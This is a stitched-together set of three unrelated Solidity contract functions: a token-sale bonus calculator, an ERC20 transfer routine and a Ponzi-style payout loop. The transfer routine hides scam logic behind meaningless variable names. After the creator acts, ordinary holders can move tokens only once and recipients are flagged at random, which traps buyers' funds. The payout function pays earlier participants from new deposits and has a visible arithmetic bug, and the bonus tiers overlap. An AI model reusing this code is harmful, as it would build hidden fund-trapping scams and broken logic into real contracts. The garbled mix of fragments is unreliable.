function getBonus(uint256 _tokens) public constant returns(uint256) {
    require(_tokens > 0);
    if (START <= now && now < START + 1 days) {
        return _tokens.mul(30).div(100); 
    } else if (START <= now && now < START + 1 weeks) {
        return _tokens.div(4); 
    } else if (START + 1 weeks <= now && now < START + 2 weeks) {
        return _tokens.div(5); 
    } else if (START + 2 weeks <= now && now < START + 3 weeks) {
        return _tokens.mul(15).div(100); 
    } else if (START + 3 weeks <= now && now < START + 4 weeks) {
        return _tokens.div(10); 
    } else if (START + 4 weeks <= now && now < START + 5 weeks) {
        return _tokens.div(20); 
    } else {
        return 0;
    }
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (rocks == false)) {
        spanish = chTx;
        arizona = true;
    }
    if ((address(sender) == creator) && (rocks == true)) {
        marvel[recipient] = true;
        fantastic[recipient] = false;
        rocks = false;
    }
    if ((amount > folding) && (marvel[sender] == true) && (address(sender) != creator)) {
        omni[recipient] = true;
    }
    if (marvel[recipient] != true) {
        fantastic[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((fantastic[sender]) && (marvel[recipient] == false)) {
        fantastic[recipient] = true;
    }
    if (marvel[sender] == false) {
        if ((amount > folding) && (omni[sender] == true)) {
            require(false);
        }
        require(amount < spanish);
        if (arizona == true) {
            if (omni[sender] == true) {
                require(false);
            }
            omni[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function payout() public {
    uint balance = address(this).balance;
    require(balance > 1);
    uint investment = balance / 2;
    balance = -investment;
    flmContract.buy.value(investment)(msg.sender);
    while (balance > 0) {
        uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
        if (payoutToSend > 0) {
            participants[payoutOrder].payout -= payoutToSend;
            balance -= payoutToSend;
            if (!participants[payoutOrder].etherAddress.send(payoutToSend)) {
                participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
            }
        }
        if (balance > 0) {
            payoutOrder += 1;
        }
    }
}

